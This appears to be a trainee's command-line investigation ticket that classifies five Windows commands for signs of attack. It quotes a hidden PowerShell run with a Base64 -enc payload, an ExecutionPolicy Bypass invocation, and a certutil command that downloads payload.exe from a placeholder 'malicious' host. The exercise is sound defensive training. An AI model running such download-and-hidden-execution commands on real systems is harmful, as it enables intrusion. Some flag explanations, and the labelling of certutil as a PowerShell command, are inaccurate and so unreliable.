# TICKET 6 — Command-Line Investigation

## powershell.exe -ExecutionPolicy Bypass script.ps1

Classification:
Suspicious

Analysis: 
This is highly suspicious powershell command, where a random script is being run with the suspicious arguments like  -ExecutionPolicy Bypass which clearly is being used to bypass all the security measure installed in the system to stop running unwanted scripts accidentally.

Suspicious Indicators:
Powershell
Script being used
suspicious arguments

Possible Objective:
Execute unauthorized or malicious scripts in the powershell.

---

## Ping 8.8.8.8

Classification:
Benign

Analysis:
It is a classic ping command often used to check the internet connectivity of the system. It pings the google’s DNS, and gets a response back if the connection is successful.

Suspicious Indicators:
None.

Possible Objective:
To check the internet connectivity of the system.

---

## powershell.exe -nop -w hidden -enc SQBFAFgA...

Classification:
Suspicious

Analysis:
This powershell command is highly suspicious, where a lot of obfuscation techniques are being used through command line arguments.  -nop is used for No Profile, which means it will not open the user settings. -w hidden is used to hide window, which means whatever process is being run, it happens in the background without user seeing it on the screen. -enc is used to encode the message or payload in Base64 which means any payload or message is hidden from the system. 

Suspicious Indicators:
-nop is used for No Profile
-w hidden is used to hide window
-enc is used to encode the message or payload

Possible Objective:
The attacker intends to run a suspicious possibly malicious script using the powershell and is using the obfuscation techniques to hide it from detection.

---

## certutil.exe -urlcache -split -f http://malicious/payload.exe payload.exe

Classification:
Suspicious

Analysis:
It is a highly suspicious powershell command, possibly a better example of LOLBins being misued. A legitimate tool like certutil.exe is being exploited to download a suspicious payload from an external address and being saved into the system as “payload.exe”
 
Suspicious Indicators:
certutil.exe a classic LOLBin
-urlcache to download remotely
-split to split and store the payload in parts
-f to force overwrite without user interaction

Possible Objective:
An attacker can use this command to download a malicious payload into the system. Or it can be used once the access is taken through other malicious acts.

---

## powershell.exe -WindowStyle Hidden

Classification:
Suspicious

Analysis:
This command is not that much suspicious in itself, but can be used by malicious actors to hide the process’s from the main screen by hiding its window.

Suspicious Indicators:
powershell.exe
-WindowStyle Hidden

Possible Objective:
To run a malicious process, hidden from the sight of the user.
